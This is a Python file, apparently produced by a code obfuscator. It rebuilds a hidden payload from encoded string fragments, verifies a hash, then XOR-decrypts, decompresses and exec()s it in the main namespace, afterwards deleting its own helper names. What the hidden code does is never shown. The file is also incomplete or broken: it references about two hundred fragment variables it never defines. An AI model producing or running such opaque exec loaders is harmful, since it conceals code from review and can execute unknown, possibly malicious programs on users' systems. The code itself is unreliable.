_crFhLhTVKoBah9 = 'Wd=G)&!@(Oy0x-%jjzz}U`w(t4P)bUES7uw>UuiWgQq5_Gx5FAK'
_cw23doir7wYdvS = '_~qssW0qq#hhj0T6H6L{2A~1H8~C?xF$jJr${hO51lqs?&HUc+D'
_cs7mgv2wM_ooqQ = 'Mbj2%C`Pse|of3Cl}D&-0gm#aJ8lgeej>Nbyf_4JmZF`GhUm9b)'
_cs1DzBJB566HI3 = '}B7ITj-+LI!0cIyDpDLZWEDw1HhMa<v>S>z#^z5mG}eML9|v6~y'
_cgUkvtM8vahUhI = 'PYxM`zJVpH7r{l*fKR?B&PLjm7_=fZP#5`Red8jwjPGt$;GCazH'
_clu2tjBdBRgnJL = 'MKadkhh=d~WJV^Nk;EQG+j{s-H^DaPhHvpO*w~s$>oZez=bFd4z'
_c_ZVCXj4tkX3EA = 'Dyp15#F9h;3C!rv0M~!DS31)e;4WU*HOy0F*8o=$<_El5CP*4A7'
_ccqz8t9idYNJ_L = 'ZjS!<m#ukE>UFNXVO3E_NkyiF8e;o?sxAFxqj}QgZFW$e9N(E^7'
_cwsugYc52esxuo = '>M44#NjGV*QQj}u{PF+YP;hO~0<sYV=bes1-w3ZCzXv>hB7wCy>'
_cs3IM9y2voCDWh = 'M-ysQLst{-8b18%OoS_!GP?$J4-EaSx;5d{yfRknHZE)yW1DuP}'
_coN_Nz1bQMZ41A = 'G8TY1j`Iop-IFJhE&$0qp33{e>XH=!n`8!vUYsPg6444wE~;xuw'
_ccvUtNVAahIrDq = 'ORvSmAi9xoGr5g0;U)28lFQ{Ki#fB_e~<p>4;e@O;WV%leqJnp+'
_cvlZkk1lWl336k = 'r6@EW%aU_~ian<M|r=!4g)p3uIcawTJi0(M1i;p-(FC)x>qOURA'
_cufHeqG_nt2Pjg = 'Lh9YL245FE+hJ4QLN0V2yd!ZXhmdVAP2{ecxQkyrUW4wAqXbVoK'
_cvpKndxacwocHQ = 'w#27d`eM|W)_+a55?%iI?w~-I$Y~mOK(^@lW%VWxy)I`4VBNq=S'
_chZUmcFAELEhCE = 'sI8-KKUOluN%FMLlLF^;OYU);t^X4N_l4ZM5EJGGP3MswsgQ)#L'
_cdrtLPVOA1xkG3 = 'n4rze1vF$DEuYd`Xj+Lv_!TwP=*0a_cvh}vP_<WL<}U4c#z?#H5'
_cpkOy903A_QETj = '3'

_pptKaKEhulbnpm = __import__('base64').b85decode(_ctBVUEjxJrTk_V + _cav9aRsCnXluUL + _cob6DK4qdVQTa_ + _cfORESBkI3S3AU + _cmQFbqByTwe7dW + _cepJd0APibtVq5 + _cviCd4O5aXceS3 + _cc3_i3zPtWxx6K + _cxnZLY91bvPMp9 + _cgYXIgmk2Yugvw + _claE292H3KYKfU + _cwujvmHbtNarpZ + _crwu7mNU1ndRcl + _crIewDoiCZkv2O + _czZISPXDlL1hzl + _ceeGj74Ln69CBI + _cg8vZphVOCo5eJ + _cynPG4am7qcPri + _caXp6Pg1djh1ib + _cqEgylsW8AT3cf + _cbKogs_DSiMZQU + _cffNVN2e4xpSRp + _ckucq4Qgy5hYOz + _cspNoHin1HpQMo + _cy47cJC8QilAaT + _cmDCjeVF0A8L7G + _ce74jc9JtkZ0rw + _ccuf4fLFi9u1ky + _cvO_Yai7Qrvpo7 + _cnNwZlmWq3MrSU + _ca8BuKS3L2eqgh + _coQquCZ_Cl9gWx + _crs7bWzD0VpRkL + _c_MgVrMbxIe5JT + _cqtENeFwPd9lX0 + _cohCGhdmCoxxWh + _clYzs7t2t_V3eS + _csmblljUsKYlUd + _crfC8o0expe1ZP + _cs3To8ModRcVN9 + _cunkH_qzm0JVgL + _cbFWCFmmIpit5D + _cfmPG3_Um5nyX9 + _cnanYP475m8m5W + _ca_W0DId5tSUe8 + _cmuuuIUK7wHxLS + _clpCfJGDYIgYXc + _ceNUdc2EMeLr1e + _czq9jXxqExfn1O + _cpaW7GMZxIszxa + _czR1hohHJt_hRz + _ciXixUWp6_pgj1 + _cuKG58YfPi32kZ + _czDC6qwKCq6xXq + _ckpdC1NkG7xSGP + _cdt3nAOk9NvBoh + _cdlgbM1DKwzSMO + _cp0KF5bTrNRiIp + _cqFbDyXbbHIvR4 + _cirQnnP_0y1kRr + _cuQXkRRDnOIhU4 + _cxgfFILGYDxQ_C + _cvos4uGkuEDa0D + _cl4aTP9zrFRU6v + _ctbsFAbft3QQAr + _cnXEJEtFzvQTXW + _chDYwuMLL9dw6a + _cpPf6ucYctkXAq + _cdxUzESxzh2Rmu + _cotRr7SNzZiOHw + _co1nLWK1nJw5wj + _c_OmSONbYAonQ8 + _cjrlXEh70ZsKMg + _cbQ0K3lGeCklk1 + _ciEuLgOWLbGmcF + _cyR7Lz_0fxbIeD + _cr2wdNREfNUy0u + _cmVA8ofoGEiFKA + _cvHlN_9pNH5ZRj + _cgTjL8iegYgkwL + _ckKMcn_hI7DDdQ + _cyEMRZkxLx5El4 + _cotHuXSz553VoY + _cwivpy1Bzc1qy6 + _cgr3dYTIDEqKhJ + _cayocvo_Nrn9IG + _cnyAPfFIiPoIdE + _cqOYwwx4LC69oV + _cl0Xw5PvBgP_Ay + _caGpn0eJfFIpAH + _csYKb7A4t5KRo1 + _coLgei3boBGJID + _cgH5LqqGNGrmMI + _cqHxKNdZYgplWj + _ce8iMcRtdLBaz3 + _cbmUJ86AQLj556 + _caO8tkGcMMRsy7 + _cyCLMKcNjKv2AM + _ccrj96O6dqHG9F + _cvzDY29OqZzLVV + _cnMwD8mvK79Ft1 + _cyYwzPESXwpmA2 + _ccUslgo7v9h0yN + _c_Ns0rDUUyRIlK + _cvD46D6x2Fmlcj + _chrclRK4GHSNmL + _ci42ZMcSQOCJEk + _cer36GYEVctvpR + _cxJthrbtVRrxBZ + _cjlxpCNLnffLfP + _cblT2uVnNFo8xM + _cwcceddrbNBYRZ + _cl5qkXvfhhYMDQ + _ccohI59PG0AlBV + _ckWGECTUNyLFsz + _cmIucrefvUWf6r + _clgMoKJLTXB7uC + _cpSGjr8LsRu1BQ + _crtSZdhi0iYJqE + _cooe0U5Mtm3XVa + _ceuM6kAtMd80Ws + _cksQTxx4HtTmSa + _c_TVn9Q4CFr8Ah + _ciZms9lWDQEn9w + _cogQ6gizUr9fpV + _cl4V5IqxV45ijy + _crpcltSfmYNA3O + _crM2BQ_GtB_6Bq + _coJ9aLjSnM_jpj + _cqBNRGe9hF_WBK + _coTEW3OfvF4duM + _cotUsNuO9HKXd4 + _chNU7mAK8Fwbms + _ce9_dIlC_k7jkF + _ceRFYMug9KJoku + _cp_SOZoMOMYCZQ + _cd7D3_fIE07XEs + _cmoPHD7SYni6V3 + _cq06bR1DbEd16U + _ctRzDvo_eSHxvC + _cgGZFQR2LZ5Hl7 + _cxUmXTIOe4mE63 + _co_sxcOQSGUBBr + _cktPW3GK7nJU1d + _ct9sYRJn2MWQNk + _czvQplf5HYMISt + _cmpB5ss_RDk6Ho + _cpN8vmPSTkKnEq + _culqOdND_8LhwF + _cnP151vm1Pzb4_ + _ckHVxmu8GQoMBe + _cjeUc2V6gi1R1O + _cxrlJ_LyAm6NNq + _cu3FS6QgtxtUMM + _cgn7_7dsGM9pzu + _cmZQQtec5A1fyb + _chFIGf9ncVgEGS + _cd5ElXUZg2GgtB + _ctnyXjTtzl2NGT + _coEFqYwVXImLgB + _cjEp3bbx2mSHlI + _cvtFtaWrU8UaAd + _cp1rDciJ6LPBQA + _csEBLXOIV1UHLv + _cb4cp7gREVKOHU + _cvL8cZtMEbfLqk + _ccE4lSsVk0Zx3x + _c_A5C4VQITMa3W + _cl0xxzL61S8vXf + _cjRQwcP6qniGvv + _cgY6vTSjZiVEBE + _cz6wmnT6cPPP_S + _chWynat7Kx6smi + _cuA9rOyI9TUK5p + _cqG0FDy_unZFuF + _cwqoUV6vFuqSGT + _cusT9Aa0fqyyiX + _cu8YTzE0as0Xc3 + _ci3kIEo1LmKV_0 + _cxVGsf__JuB9xQ + _cvxjmPaqEe95HS + _czeYVYTS_wKqp9 + _csbDw2psEhMY4v + _ciQ6eIbX8tgI7z + _cg7dH3Iglcfn_T + _cnX6jrE5b8PaI0 + _crDZPNWzcM9g2Z + _cxY_8oSbEEVAhH + _cg6Pwmaj2I0qPz + _ccLChXeNhmugyL + _cvDbDqxN1xaCK2 + _caePjpSwdqD8Sg + _cqedfXUSC2x8tW + _coAd81S9CWLgCT + _clz76QgQtzYIHH + _csGHAMS3uuGZUA + _crzIP22uslx9Be + _cn0feavHoSfb4x + _cnAgBvfeq9obrs + _cyjbg6APGVpwCj + _czNEDYjLdxM7Fi + _c_SLp3v767lmst + _chq28SDIa0v8fx + _cwDGP3D0TxtQAZ + _cqf8iuJ6YYr75j + _crFhLhTVKoBah9 + _cw23doir7wYdvS + _cs7mgv2wM_ooqQ + _cs1DzBJB566HI3 + _cgUkvtM8vahUhI + _clu2tjBdBRgnJL + _c_ZVCXj4tkX3EA + _ccqz8t9idYNJ_L + _cwsugYc52esxuo + _cs3IM9y2voCDWh + _coN_Nz1bQMZ41A + _ccvUtNVAahIrDq + _cvlZkk1lWl336k + _cufHeqG_nt2Pjg + _cvpKndxacwocHQ + _chZUmcFAELEhCE + _cdrtLPVOA1xkG3 + _cpkOy903A_QETj)
if __import__('hashlib').sha256(_pptKaKEhulbnpm).hexdigest() != 'e0e813fe57306bbcf06231612a98f73fcc5f7893ca8804a28b3db71c15540988':
    __import__('sys').exit(1)
_x_bgJZRBgGR4jO = bytes([198, 35, 219, 126, 114, 156, 60, 240, 10, 186, 69, 196, 175, 231, 9, 173, 80, 102, 254, 227, 95, 199, 95, 45, 181, 205, 233, 29, 135, 159, 23, 211])
_fkx0MYPxurRPgMA = bytes([26, 185, 122, 110, 255, 118, 247, 254, 39, 18, 177, 65, 247, 213, 178, 151, 112, 2, 164, 45, 80, 150, 41, 179, 209, 149, 72, 0, 45, 26, 157, 160])

def _fxay7mFlkiKPnQl(_bk4dfg8gq25Np9, _kqylX6BjPdpgxF):
    return bytes(_bk4dfg8gq25Np9[_igiwDs_N8MGhg0] ^ _kqylX6BjPdpgxF[_igiwDs_N8MGhg0 % len(_kqylX6BjPdpgxF)] for _igiwDs_N8MGhg0 in range(len(_bk4dfg8gq25Np9)))

def _fdyb2UZhvnnN_gy(_tbyO5tZJ45EzWq):
    import zlib
    return zlib.decompress(_tbyO5tZJ45EzWq) # Un seul niveau de zlib ici pour simplifier

def _felECaxL1zMRBOZ():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xsgs8hHiFVxCtu = _fxay7mFlkiKPnQl(_pptKaKEhulbnpm, _x_bgJZRBgGR4jO)
    # 2. Décompression Zlib
    _dbPOmPMqWivm5H = _fdyb2UZhvnnN_gy(_xsgs8hHiFVxCtu)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dbPOmPMqWivm5H.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _na7SDesdZrghNa = _main.__dict__
    _na7SDesdZrghNa.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _na7SDesdZrghNa)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_felECaxL1zMRBOZ()
try:
    del _fxay7mFlkiKPnQl, _fdyb2UZhvnnN_gy, _felECaxL1zMRBOZ
    del _pptKaKEhulbnpm, _x_bgJZRBgGR4jO, _fkx0MYPxurRPgMA
except:
    pass
